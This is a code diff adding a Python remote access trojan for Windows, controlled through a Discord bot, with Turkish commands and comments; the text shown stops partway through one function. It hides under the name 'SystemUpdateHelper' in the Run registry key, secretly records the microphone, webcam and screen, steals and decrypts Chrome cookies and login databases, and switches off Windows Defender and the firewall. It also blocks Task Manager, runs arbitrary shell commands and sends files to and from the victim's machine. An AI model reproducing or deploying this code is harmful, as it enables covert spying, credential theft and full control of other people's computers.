@@ -1,0 +1,1236 @@
+import asyncio
+import ctypes
+from io import BytesIO
+import logging
+import os
+import platform
+import re
+import shutil
+import subprocess
+import sys
+import threading
+import time
+import webbrowser
+import winreg
+import zipfile
+from discord.ext import commands
+import discord
+from PIL import ImageGrab
+
+logging.basicConfig(
+    level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s"
+)
+
+# --- AYARLAR ---
+TOKEN = "KENDİ_TOKENİNİ_GİR"
+COMMAND_PREFIX = "!"
+BOT_INTENTS = discord.Intents.all()
+
+REG_KEY_NAME = "SystemUpdateHelper"
+REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
+client = commands.Bot(command_prefix=COMMAND_PREFIX, intents=BOT_INTENTS)
+client.remove_command("help")
+
+
+def resource_path(relative_path):
+  try:
+    base_path = sys._MEIPASS
+  except Exception:
+    base_path = os.path.abspath(".")
+  return os.path.join(base_path, relative_path)
+
+
+async def send_help_menu(destination):
+  try:
+    if os.path.exists(resource_path("art.txt")):
+      with open(resource_path("art.txt"), "r", encoding="utf-8") as f:
+        ascii_art = f.read()
+        if len(ascii_art) > 400:
+          ascii_art = ascii_art[:400] + "\n..."
+    else:
+      ascii_art = "---------------- KOMUTLAR --------------"
+
+    part1 = """!help / !yardim    = Bu Menüyü Gösterir
+!bilgi            = Bilgisayar Bilgilerini ve Aktif Pencereyi Gösterir
+!ss               = Ekran Görüntüsü Alır
+!otomatiks <a,ar> = Döngülü Ekran Görüntüsü Alır
+!gif <saniye>     = Kısa Ekran GIF'i Alır
+!kamera           = Kameradan Anlık Fotoğraf Çeker
+!seskayit <saniye>= Gizli Mikrofon Kaydı Alır
+!faresalla <sn>   = Fareyi rastgele sallar
+!pwd              = Aktif Dizini Gösterir
+!ls               = Dosyaları Listeler
+!cd <klasör>      = Dizin Değiştirir
+!touch <dosya>    = Yeni Dosya Oluşturur
+!mkdir <klasör>   = Yeni Klasör Oluşturur
+!rm <hedef>       = Dosya veya Klasör Siler
+!ac <dosya>       = Hedefteki dosyayı/programı açar
+!unzip <dosya>    = ZIP arşivini olduğu yere çıkarır
+!yükle <dosya>    = Belirtilen dosyayı Dcye atar
+!indir            = Discord'dan atılan dosyayı kaydeder
+!dosyaindir <yol> = Bilgisayardan dosya çeker
+!cmd <komut>      = CMD komutu çalıştırır
+!url <site>       = Yazılan URL'yi Açar
+!mesaj <yazı>     = Ekrana pop-up mesaj atar
+!duvarkagidi      = Gönderilen resmi duvar kağıdı yapar
+!ekrankapat       = Monitörü uyku moduna alır
+!bip              = Anakarttan bip sesi çaldırır
+!cerezler         = Cookieleri calar"""
+
+    part2 = """!kapat            = Bilgisayarı Kapatır
+!yenidenbaslat    = Bilgisayarı Yeniden Başlatır
+!gorevler         = Çalışan uygulamaları/işlemleri listeler
+!gorevkapatma     = Görev Yöneticisini sürekli engeller
+!islemkapat <isim>= Belirtilen işlemi sonlandırır
+!sifreler         = Kayıtlı tarayıcı verilerini arar
+!tokencek         = Aktif Discord hesap token'larını çeker
+!sescal <dosya>   = Arka planda gizli ses çalar
+!suruculer        = Aktif disk sürücülerini listeler
+!ara <dosya>      = Bilgisayarda dosya aratır
+!yaz <metin>      = Klavyeden otomatik yazı yazdırır
+!oturumkilitle    = Windows oturumunu kilitler
+!agbilgi          = Detaylı ağ ve IP bilgilerini gösterir
+!simgeler         = Masaüstü simgelerini gizler/gösterir
+!konustur <metin> = Bilgisayara sesli konuşma yaptırır
+!pil              = Pil ve şarj durumunu gösterir
+!baglantilar      = Aktif ağ bağlantılarını listeler
+!copkutusu        = Çöp kutusunu tamamen boşaltır
+!serviskapat <s.> = Windows servisini durdurur
+!kullanicilar     = Yerel kullanıcı hesaplarını listeler
+!pencereler       = Ekranda açık pencereleri listeler
+!sessiz           = Sesi kapatır / açar (mute)
+!parlaklik <0-100>= Ekran parlaklığını ayarlar
+!dosyayukle <yol> = Dc'den dosyayı hedefe kaydeder
+!guvenlikduvari   = Güvenlik duvarını açar/kapatır
+!defenderkapat    = Windows Defender'ı açar/kapatır
+!macadres         = Ağ kartının MAC adresini gösterir
+!usbengelle <dur> = USB bellek engelleme (kapat/ac)
+!acikportlar      = Aktif TCP/UDP portlarını listeler
+!gorevyoneticisikapat = Görev Yöneticisini kilitler/açar
+!sistemdili       = Klavye dilini değiştirir
+!vdur             = Virüsü Durdurur
+!vsil             = Virüsü Siler"""
+
+    await destination.send(f"```text\n{ascii_art}\n\n{part1}\n```")
+    await destination.send(f"```text\n{part2}\n```")
+  except Exception as e:
+    print(f"Hata: {e}")
+
+
+@client.event
+async def on_ready():
+  print(f"{client.user} giriş yaptı!")
+  channel = client.get_channel(1557814318769373325)
+  if channel:
+    await send_help_menu(channel)
+
+  try:
+    add_to_startup()
+    print("[+] Başlangıca eklendi.")
+  except Exception as e:
+    print(f"[-] Başlangıca ekleme hatası: {e}")
+
+
+def add_to_startup():
+  try:
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE)
+    exe_path = sys.executable
+    winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
+    winreg.CloseKey(key)
+  except Exception:
+    pass
+
+
+def remove_from_startup():
+  try:
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE)
+    winreg.DeleteValue(key, REG_KEY_NAME)
+    winreg.CloseKey(key)
+  except Exception:
+    pass
+
+
+current_dir = os.getcwd()
+
+
+# --- YENİ EKLENEN USB ENGELLEME KOMUTU ---
+@client.command(name="usbengelle")
+async def usb_block_toggle(ctx, durum: str = None):
+  """USB bellekleri registry üzerinden engeller veya açar.
+
+  Kullanım: !usbengelle kapat VEYA !usbengelle ac
+  """
+  if not durum:
+    await ctx.send("⚠️ Kullanım: `!usbengelle kapat` veya `!usbengelle ac`")
+    return
+
+  durum = durum.lower()
+  if durum == "kapat":
+    val = 4
+    msg = "🔌❌ USB depolama aygıtları engellendi!"
+  elif durum == "ac":
+    val = 3
+    msg = "🔌✅ USB depolama aygıtları yeniden etkinleştirildi!"
+  else:
+    await ctx.send("⚠️ Hatalı parametre! `ac` veya `kapat` yazmalısın.")
+    return
+
+  def set_usb():
+    try:
+      reg_path = r"SYSTEM\CurrentControlSet\Services\USBSTOR"
+      key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
+      winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, val)
+      winreg.CloseKey(key)
+      return True
+    except Exception:
+      return False
+
+  success = await asyncio.get_running_loop().run_in_executor(None, set_usb)
+  if success:
+    await ctx.send(msg)
+  else:
+    await ctx.send("❌ İşlem başarısız (Yönetici hakları gerekebilir).")
+
+
+# --- YENİ EKLENEN AÇIK PORTLAR KOMUTU ---
+@client.command(name="acikportlar")
+async def list_open_ports(ctx):
+  """Sistemdeki aktif TCP/UDP dinleme portlarını ve süreçleri listeler."""
+  try:
+    output = subprocess.check_output(
+        "netstat -ano | findstr LISTENING", shell=True, encoding="latin-1"
+    )
+    if not output.strip():
+      output = "Aktif dinlemede port bulunamadı."
+    if len(output) > 1900:
+      output = output[:1900] + "\n..."
+    await ctx.send(f"🌐 **Aktif Dinlenen Portlar:**\n```text\n{output}\n```")
+  except Exception as e:
+    await ctx.send(f"❌ Hata oluştu: `{e}`")
+
+
+@client.command(name="macadres")
+async def get_mac_address(ctx):
+  """Bilgisayarın ağ kartlarının fiziksel MAC adreslerini listeler."""
+  try:
+    output = subprocess.check_output(
+        "getmac /fo table /nh", shell=True, encoding="latin-1"
+    )
+    if not output.strip():
+      import uuid
+
+      mac = ":".join(
+          [
+              "{:02x}".format((uuid.getnode() >> ele) & 0xFF)
+              for ele in range(0, 8 * 6, 8)
+          ][::-1]
+      )
+      output = f"Ana MAC (UUID): {mac}"
+
+    if len(output) > 1900:
+      output = output[:1900] + "\n..."
+    await ctx.send(f"🌐 **MAC Adresleri ve Ağ Arayüzleri:**\n```text\n{output}\n```")
+  except Exception as e:
+    await ctx.send(f"❌ Hata oluştu: `{e}`")
+
+
+@client.command(name="defenderkapat")
+async def defender_toggle(ctx, durum: str = None):
+  """Windows Defender gerçek zamanlı korumasını açar veya kapatır.
+
+  Kullanım: !defenderkapat kapat VEYA !defenderkapat ac
+  """
+  if not durum:
+    await ctx.send("⚠️ Kullanım: `!defenderkapat kapat` veya `!defenderkapat ac`")
+    return
+
+  durum = durum.lower()
+  if durum == "kapat":
+    ps_cmd = "Set-MpPreference -DisableRealtimeMonitoring $true"
+    msg = "🛡️❌ Windows Defender gerçek zamanlı koruması devre dışı bırakıldı!"
+  elif durum == "ac":
+    ps_cmd = "Set-MpPreference -DisableRealtimeMonitoring $false"
+    msg = "🛡️✅ Windows Defender gerçek zamanlı koruması etkinleştirildi!"
+  else:
+    await ctx.send("⚠️ Hatalı parametre! `ac` veya `kapat` yazmalısın.")
+    return
+
+  try:
+    result = subprocess.run(
+        ["powershell", "-Command", ps_cmd],
+        capture_output=True,
+        text=True,
+        encoding="latin-1",
+    )
+    if result.returncode == 0:
+      await ctx.send(msg)
+    else:
+      await ctx.send(
+          f"❌ İşlem başarısız (Yönetici hakları veya Tamper Protection"
+          f" engelleyebilir):\n`{result.stderr.strip()}`"
+      )
+  except Exception as e:
+    await ctx.send(f"❌ Hata oluştu: `{e}`")
+
+
+@client.command(name="guvenlikduvari")
+async def firewall_toggle(ctx, durum: str = None):
+  """Windows Güvenlik Duvarı'nı açar veya kapatır.
+
+  Kullanım: !guvenlikduvari kapat VEYA !guvenlikduvari ac
+  """
+  if not durum:
+    await ctx.send("⚠️ Kullanım: `!guvenlikduvari kapat` veya `!guvenlikduvari ac`")
+    return
+
+  durum = durum.lower()
+  if durum == "kapat":
+    cmd = "netsh advfirewall set allprofiles state off"
+    msg = "🔓 Windows Güvenlik Duvarı devre dışı bırakıldı!"
+  elif durum == "ac":
+    cmd = "netsh advfirewall set allprofiles state on"
+    msg = "🔒 Windows Güvenlik Duvarı etkinleştirildi!"
+  else:
+    await ctx.send("⚠️ Hatalı parametre! `ac` veya `kapat` yazmalısın.")
+    return
+
+  try:
+    result = subprocess.run(
+        cmd, shell=True, capture_output=True, text=True, encoding="latin-1"
+    )
+    if result.returncode == 0:
+      await ctx.send(msg)
+    else:
+      await ctx.send(
+          f"❌ İşlem başarısız (Yönetici hakları gerekebilir):\n`{result.stderr.strip()}`"
+      )
+  except Exception as e:
+    await ctx.send(f"❌ Hata oluştu: `{e}`")
+
+
+@client.command(name="dosyaindir")
+async def download_file(ctx, *, dosya_yolu: str):
+  dosya_yolu = dosya_yolu.strip('"\'')
+
+  if not os.path.exists(dosya_yolu) or not os.path.isfile(dosya_yolu):
+    await ctx.send("❌ Belirtilen yol geçersiz veya dosya bulunamadı kanka.")
+    return
+
+  try:
+    dosya_boyutu_mb = os.path.getsize(dosya_yolu) / (1024 * 1024)
+    if dosya_boyutu_mb > 25:
+      await ctx.send(
+          f"⚠️ Dosya çok büyük ({dosya_boyutu_mb:.2f} MB)! Discord limitini"
+          " aşabilir."
+      )
+
+    await ctx.send("📁 Dosya gönderiliyor...", file=discord.File(dosya_yolu))
+  except Exception as e:
+    await ctx.send(f"❌ Dosya gönderilirken hata oluştu: `{e}`")
+
+
+@client.command(name="dosyayukle")
+async def upload_file(ctx, *, hedef_yol: str = None):
+  if not ctx.message.attachments:
+    await ctx.send("⚠️ Kanka mesajla birlikte bir dosya yüklemelisin!")
+    return
+
+  if not hedef_yol:
+    await ctx.send(
+        "⚠️ Dosyanın nereye kaydedileceğini belirtmedin! Örn: `!dosyayukle"
+        r" C:\Klasor\`"
+    )
+    return
+
+  hedef_yol = hedef_yol.strip('"\'')
+  attachment = ctx.message.attachments[0]
+
+  if os.path.isdir(hedef_yol) or hedef_yol.endswith(("\\", "/")):
+    os.makedirs(hedef_yol, exist_ok=True)
+    save_path = os.path.join(hedef_yol, attachment.filename)
+  else:
+    folder = os.path.dirname(hedef_yol)
+    if folder:
+      os.makedirs(folder, exist_ok=True)
+    save_path = hedef_yol
+
+  try:
+    await attachment.save(save_path)
+    await ctx.send(f"✅ Dosya başarıyla hedefe kaydedildi:\n`{save_path}`")
+  except Exception as e:
+    await ctx.send(f"❌ Kaydetme sırasında hata oluştu: `{e}`")
+
+
+@client.command(name="cerezler")
+async def get_browser_cookies(ctx):
+  """Chrome çerez veritabanından Roblox, Steam ve diğer kritik sitelerin çerezlerini çeker."""
+  try:
+    import sqlite3
+    try:
+      import win32crypt
+    except ImportError:
+      win32crypt = None
+
+    local_app = os.environ.get("LOCALAPPDATA", "")
+    cookie_path = os.path.join(
+        local_app, r"Google\Chrome\User Data\Default\Network\Cookies"
+    )
+    if not os.path.exists(cookie_path):
+      cookie_path = os.path.join(
+          local_app, r"Google\Chrome\User Data\Default\Cookies"
+      )
+
+    if not os.path.exists(cookie_path):
+      await ctx.send("❌ Chrome çerez dosyası bulunamadı.")
+      return
+
+    temp_db = "temp_cookies.db"
+    shutil.copyfile(cookie_path, temp_db)
+
+    conn = sqlite3.connect(temp_db)
+    cursor = conn.cursor()
+    
+    # Roblox, Steam, Google, Discord gibi hedef platformların çerezlerini filtreleyelim
+    cursor.execute("""
+      SELECT host_key, name, encrypted_value FROM cookies 
+      WHERE host_key LIKE '%roblox.com%' 
+         OR host_key LIKE '%steampowered.com%' 
+         OR host_key LIKE '%steamcommunity.com%' 
+         OR host_key LIKE '%discord.com%' 
+         OR host_key LIKE '%google.com%'
+      LIMIT 30
+    """)
+    
+    cookie_results = []
+    for host, name, enc_value in cursor.fetchall():
+      val = "Şifreli (DPAPI)"
+      if win32crypt and enc_value:
+        try:
+          decrypted = win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1]
+          val = decrypted.decode("utf-8", errors="ignore")
+        except:
+          pass
+      cookie_results.append(f"Site: {host} | İsim: {name} | Değer: {val}")
+
+    conn.close()
+    try:
+      os.remove(temp_db)
+    except:
+      pass
+
+    if cookie_results:
+      output = "\n".join(cookie_results)
+      if len(output) > 1900:
+        output = output[:1900] + "\n..."
+      await ctx.send(f"🍪 **Yakalanan Kritik Çerezler (Roblox, Steam vb.):**\n```text\n{output}\n```")
+    else:
+      await ctx.send("⚠️ Hedef sitelere ait aktif çerez bulunamadı.")
+
+  except Exception as e:
+    await ctx.send(f"❌ Çerez çekme hatası: `{e}`")
+
+
+@client.command(name="faresalla")
+async def shake_mouse(ctx, sure: int = 5):
+  try:
+    import random
+
+    if sure > 15:
+      sure = 15
+    await ctx.send(f"🖱️ Fare {sure} saniye boyunca sallanıyor...")
+    end_time = time.time() + sure
+    user32 = ctypes.windll.user32
+    while time.time() < end_time:
+      x = random.randint(100, 800)
+      y = random.randint(100, 800)
+      user32.SetCursorPos(x, y)
+      await asyncio.sleep(0.2)
+    await ctx.send("✅ Fare sallama bitti.")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="otomatiks")
+async def auto_screenshot(ctx, adet: int = 3, aralik: int = 5):
+  try:
+    if adet > 5:
+      adet = 5
+    await ctx.send(
+        f"📸 {adet} adet ekran görüntüsü {aralik} saniye arayla alınıyor..."
+    )
+    for i in range(adet):
+      img = ImageGrab.grab()
+      output = BytesIO()
+      img.save(output, format="PNG")
+      output.seek(0)
+      await ctx.send(
+          f"Kare {i+1}/{adet}",
+          file=discord.File(fp=output, filename=f"ss_{i+1}.png"),
+      )
+      if i < adet - 1:
+        await asyncio.sleep(aralik)
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="gorevkapatma")
+async def block_task_manager(ctx):
+  try:
+    def blocker():
+      for _ in range(30):
+        try:
+          subprocess.run(
+              "taskkill /f /im Taskmgr.exe",
+              shell=True,
+              capture_output=True,
+              creationflags=0x08000000,
+          )
+        except:
+          pass
+        time.sleep(3)
+
+    threading.Thread(target=blocker, daemon=True).start()
+    await ctx.send("🛡️ Görev Yöneticisi engelleme modu aktif!")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="sifreler")
+async def check_browser_data(ctx):
+  try:
+    local_app = os.environ.get("LOCALAPPDATA", "")
+    chrome_path = os.path.join(
+        local_app, r"Google\Chrome\User Data\Default\Login Data"
+    )
+    if os.path.exists(chrome_path):
+      temp_db = "temp_login.db"
+      shutil.copyfile(chrome_path, temp_db)
+      await ctx.send(file=discord.File(temp_db, filename="LoginData.db"))
+      os.remove(temp_db)
+    else:
+      await ctx.send("❌ Chrome Login Data veritabanı bulunamadı.")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+# --- KOMUTLAR ---
+@client.command(name="yardim", aliases=["help"])
+async def help_command(ctx):
+  await send_help_menu(ctx)
+
+
+@client.command(name="gif")
+async def screen_gif(ctx, sure: int = 3, fps: int = 4):
+  try:
+    if sure > 10:
+      sure = 10
+    frames = []
+    total_frames = sure * fps
+    interval = 1.0 / fps
+    await ctx.send(f"🎬 {sure} saniyelik ekran GIF'i alınıyor...")
+    for _ in range(total_frames):
+      img = ImageGrab.grab().resize((640, 360))
+      frames.append(img)
+      await asyncio.sleep(interval)
+
+    output = BytesIO()
+    frames[0].save(
+        output,
+        format="GIF",
+        save_all=True,
+        append_images=frames[1:],
+        duration=int(1000 / fps),
+        loop=0,
+    )
+    output.seek(0)
+    file = discord.File(fp=output, filename="screen.gif")
+    await ctx.send(file=file)
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="kamera")
+async def webcam_photo(ctx):
+  try:
+    import cv2
+
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+      await ctx.send("❌ Kamera açılamadı veya bulunamadı!")
+      return
+
+    ret, frame = cap.read()
+    cap.release()
+
+    if not ret:
+      await ctx.send("❌ Kameradan görüntü alınamadı!")
+      return
+
+    path = "temp_cam.jpg"
+    cv2.imwrite(path, frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
+    await ctx.send(file=discord.File(fp=path, filename="kamera.jpg"))
+    os.remove(path)
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="seskayit")
+async def record_audio(ctx, duration: int = 5):
+  try:
+    import sounddevice as sd
+    import wave
+
+    if duration > 20:
+      duration = 20
+    fs = 16000
+    await ctx.send(f"🎙️ {duration} saniyelik gizli mikrofon kaydı başlıyor...")
+
+    audio = sd.rec(
+        int(duration * fs), samplerate=fs, channels=1, dtype="int16"
+    )
+    sd.wait()
+
+    path = "temp_mic.wav"
+    with wave.open(path, "wb") as wf:
+      wf.setnchannels(1)
+      wf.setsampwidth(2)
+      wf.setframerate(fs)
+      wf.writeframes(audio.tobytes())
+
+    await ctx.send(file=discord.File(fp=path, filename="mikrofon_kayit.wav"))
+    os.remove(path)
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command()
+async def pwd(ctx):
+  global current_dir
+  try:
+    await ctx.send(f"```bash\n{current_dir}\n```")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command()
+async def vsil(ctx):
+  try:
+    await ctx.send("🔥 Virüs tamamen imha ediliyor ve izler siliniyor...")
+    remove_from_startup()
+
+    exe_path = sys.executable
+    bat_path = os.path.join(os.environ["TEMP"], "cleanup.bat")
+
+    bat_content = f"""@echo off
+timeout /t 2 /nobreak > nul
+del /f /q "{exe_path}"
+del "%~f0"
+"""
+
+    with open(bat_path, "w", encoding="utf-8") as f:
+      f.write(bat_content)
+
+    subprocess.Popen(bat_path, shell=True, creationflags=0x08000000)
+
+    await client.close()
+    os._exit(0)
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command()
+async def yükle(ctx, *, dosya_adi: str):
+  global current_dir
+  try:
+    file_path = os.path.join(current_dir, dosya_adi)
+
+    if not os.path.exists(file_path):
+      await ctx.send(
+          f"❌ `{dosya_adi}` bu klasörde bulunamadı!\n📁 Aktif Konum:"
+          f" `{current_dir}`"
+      )
+      return
+
+    with open(file_path, "rb") as f:
+      await ctx.send(file=discord.File(fp=f, filename=dosya_adi))
+  except Exception as e:
+    await ctx.send(f"💥 Hata: `{e}`")
+
+
+@client.command()
+async def indir(ctx):
+  global current_dir
+  try:
+    if not ctx.message.attachments:
+      await ctx.send("❌ Mesaja eklenmiş bir dosya bulamadım!")
+      return
+
+    attachment = ctx.message.attachments[0]
+    save_path = os.path.join(current_dir, attachment.filename)
+
+    await attachment.save(save_path)
+    await ctx.send(
+        f"✅ `{attachment.filename}` başarıyla şu konuma kaydedildi:\n📁"
+        f" `{save_path}`"
+    )
+  except Exception as e:
+    await ctx.send(f"💥 Hata: `{e}`")
+
+
+@client.command(name="gorevler")
+async def list_tasks(ctx):
+  try:
+    output = subprocess.check_output(
+        ["tasklist", "/FO", "TABLE", "/NH"], shell=True
+    ).decode("latin-1")
+    if len(output) > 1900:
+      output = output[:1900] + "\n..."
+    await ctx.send(f"```text\n{output}\n```")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="agbilgi")
+async def net_info(ctx):
+  try:
+    output = subprocess.check_output(
+        ["ipconfig", "/all"], shell=True, encoding="latin-1"
+    )
+    if len(output) > 1900:
+      output = output[:1900] + "\n..."
+    await ctx.send(f"```text\n{output}\n```")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="yaz")
+async def type_text(ctx, *, metin: str):
+  try:
+    safe_metin = metin.replace('"', '`"')
+    ps_cmd = (
+        "Add-Type -AssemblyName System.Windows.Forms;"
+        f" [System.Windows.Forms.SendKeys]::SendWait('{safe_metin}')"
+    )
+    subprocess.run(["powershell", "-Command", ps_cmd], shell=True)
+    await ctx.send(f"Metin yazdırıldı: `{metin}` ⌨️")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="ara")
+async def search_file(ctx, *, dosya: str):
+  try:
+    cmd = f"dir /s /b C:\\*{dosya}*"
+    output = subprocess.check_output(
+        cmd, shell=True, text=True, encoding="latin-1"
+    )
+    lines = output.strip().split("\n")
+    if len(lines) > 15:
+      lines = lines[:15] + ["... (sonuç çok uzun, kesildi)"]
+    await ctx.send(f"```text\n{'\n'.join(lines)}\n```")
+  except Exception as e:
+    await ctx.send(f"Sonuç bulunamadı veya hata: {e}")
+
+
+@client.command(name="suruculer")
+async def list_drives(ctx):
+  try:
+    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+    drives = [chr(65 + i) + ":\\" for i in range(26) if bitmask & (1 << i)]
+    await ctx.send(f"💻 **Aktif Sürücüler:** `{' '.join(drives)}`")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="islemkapat")
+async def kill_task(ctx, *, isim: str):
+  try:
+    subprocess.run(
+        ["taskkill", "/f", "/im", isim], shell=True, capture_output=True
+    )
+    await ctx.send(f"`{isim}` işlemi sonlandırıldı 🛑")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command()
+async def ls(ctx, *, args=""):
+  global current_dir
+  try:
+    if os.name == "nt":
+      files = os.listdir(current_dir)
+      output = "\n".join(files) if files else "Boş"
+    else:
+      cmd = "ls"
+      if args:
+        cmd += f" {args}"
+      result = subprocess.run(
+          cmd,
+          shell=True,
+          cwd=current_dir,
+          capture_output=True,
+          text=True,
+          encoding="utf-8",
+          errors="ignore",
+          timeout=10,
+      )
+      output = result.stdout or result.stderr
+
+    if len(output) > 1900:
+      output = output[:1900] + "\n... (Çıktı çok uzun)"
+    await ctx.send(f"```bash\n{output or 'Boş'}\n```")
+  except Exception as e:
+    await ctx.send(f"❌ Hata: {e}")
+
+
+@client.command()
+async def cd(ctx, *, target: str = None):
+  global current_dir
+  if not target:
+    target = ".."
+  try:
+    new_path = os.path.abspath(os.path.join(current_dir, target))
+    if os.path.isdir(new_path):
+      os.chdir(new_path)
+      current_dir = new_path
+      await ctx.send(f"📁 Dizin değiştirildi: `{current_dir}`")
+      files = os.listdir(current_dir)
+      output = "\n".join(files) if files else "Boş"
+      await ctx.send(f"```bash\n{output}\n```")
+    else:
+      await ctx.send("❌ Böyle bir klasör bulunamadı!")
+  except Exception as e:
+    await ctx.send(f"❌ Hata: {e}")
+
+
+@client.command()
+async def touch(ctx, *, filename: str):
+  global current_dir
+  try:
+    filepath = os.path.join(current_dir, filename)
+    with open(filepath, "w") as f:
+      pass
+    await ctx.send(f"✅ Dosya oluşturuldu: `{filename}`")
+  except Exception as e:
+    await ctx.send(f"❌ Hata: {e}")
+
+
+@client.command()
+async def mkdir(ctx, *, dirname: str):
+  global current_dir
+  try:
+    dirpath = os.path.join(current_dir, dirname)
+    os.makedirs(dirpath, exist_ok=True)
+    await ctx.send(f"✅ Klasör oluşturuldu: `{dirname}`")
+  except Exception as e:
+    await ctx.send(f"❌ Hata: {e}")
+
+
+@client.command()
+async def rm(ctx, *, target: str):
+  global current_dir
+  try:
+    path = os.path.join(current_dir, target)
+    if os.path.isfile(path):
+      os.remove(path)
+      await ctx.send(f"🗑️ Dosya silindi: `{target}`")
+    elif os.path.isdir(path):
+      import shutil
+
+      shutil.rmtree(path)
+      await ctx.send(f"🗑️ Klasör silindi: `{target}`")
+    else:
+      await ctx.send("❌ Böyle bir dosya veya klasör bulunamadı!")
+  except Exception as e:
+    await ctx.send(f"❌ Hata: {e}")
+
+
+@client.command()
+async def ac(ctx, *, dosya_adi: str):
+  global current_dir
+  try:
+    dosya_yolu = os.path.join(current_dir, dosya_adi)
+    if os.path.exists(dosya_yolu):
+      os.startfile(dosya_yolu)
+      await ctx.send(f"✅ Dosya açıldı: `{dosya_adi}`")
+    else:
+      await ctx.send("❌ Böyle bir dosya bulunamadı!")
+  except Exception as e:
+    await ctx.send(f"❌ Hata: {e}")
+
+
+@client.command()
+async def unzip(ctx, *, filename: str):
+  global current_dir
+  try:
+    filepath = os.path.join(current_dir, filename)
+    with zipfile.ZipFile(filepath, "r") as zip_ref:
+      zip_ref.extractall(current_dir)
+    await ctx.send(f"📦 Arşiv başarıyla çıkarıldı: `{filename}`")
+  except Exception as e:
+    await ctx.send(f"❌ Hata: {e}")
+
+
+@client.command()
+async def cmd(ctx, *, komut: str):
+  global current_dir
+  try:
+    result = subprocess.run(
+        komut,
+        shell=True,
+        cwd=current_dir,
+        capture_output=True,
+        text=True,
+        encoding="utf-8",
+        errors="ignore",
+        timeout=15,
+    )
+    output = result.stdout or result.stderr
+    if not output:
+      output = "Komut başarıyla çalıştırıldı (Çıktı yok)."
+    if len(output) > 1900:
+      output = output[:1900] + "\n... (Çıktı çok uzun)"
+    await ctx.send(f"```bash\n{output}\n```")
+  except Exception as e:
+    await ctx.send(f"❌ Hata: {e}")
+
+
+@client.command()
+async def gonder(ctx, *, dosya_adi: str):
+  global current_dir
+  try:
+    filepath = os.path.join(current_dir, dosya_adi)
+    if os.path.exists(filepath):
+      await ctx.send(file=discord.File(filepath))
+    else:
+      await ctx.send("❌ Belirtilen dosya bulunamadı!")
+  except Exception as e:
+    await ctx.send(f"❌ Hata: {e}")
+
+
+@client.command()
+async def kapat(ctx):
+  try:
+    await ctx.send("💻 Bilgisayar kapatılıyor...")
+    os.system("shutdown /s /t 1")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command()
+async def yenidenbaslat(ctx):
+  try:
+    await ctx.send("🔄 Bilgisayar yeniden başlatılıyor...")
+    os.system("shutdown /r /t 1")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command()
+async def vdur(ctx):
+  try:
+    await ctx.send("🛑 Virüs durduruluyor...")
+    await client.close()
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="bip")
+async def beep(ctx, frequency: int = 1000, duration: int = 500):
+  import winsound
+
+  try:
+    winsound.Beep(frequency, duration)
+    await ctx.send(f"{frequency} Hz değerinde bip sesi çalındı.")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command(name="duvarkagidi")
+async def wallpaper(ctx):
+  try:
+    if not ctx.message.attachments:
+      await ctx.send("Lütfen komutla birlikte bir resim dosyası yükle!")
+      return
+    attachment = ctx.message.attachments[0]
+    path = "temp_wall.jpg"
+    await attachment.save(path)
+
+    abs_path = os.path.abspath(path)
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
+    await ctx.send("Duvar kağıdı başarıyla değiştirildi!")
+  except Exception as e:
+    await ctx.send(f"Hata: {e}")
+
+
+@client.command()
+async def bilgi(ctx):
+  try:
+    hostname = platform.node()
+    local_ip = get_local_ip()
+    public_ip = get_public_ip()
+    os_info = f"{platform.system()} {platform.release()} (v{platform.version()})"
+    user_info = os.getlogin()
+
+    try:
+      is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except Exception:
+      is_admin = False
+    admin_status = "Evet" if is_admin else "Hayır"
+
+    try:
+      hwnd = ctypes.windll.user32.GetForegroundWindow()
+      length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+      buff = ctypes.create_unicode_buffer(length + 1)
+      ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
+      active_window = buff.value if buff.value else "Bilinmiyor"
+    except Exception:
+      active_window = "Alınamadı"
+
+    info = (
+        f"**Sistem Bilgileri:**\n- **Kullanıcı:** `{user_info}`\n- **Bilgisayar"
+        f" Adı:** `{hostname}`\n- **Yerel IP:** `{local_ip}`\n- **Kamu"
+        f" IP:** `{public_ip}`\n- **İşletim Sistemi:** `{os_info}`\n-"
+        f" **Yönetici Hakları:** `{admin_status}`\n- **Aktif Pencere:**"
+        f" `{active_window}`"
+    )
+    await ctx.send(info)
+  except Exception as e:
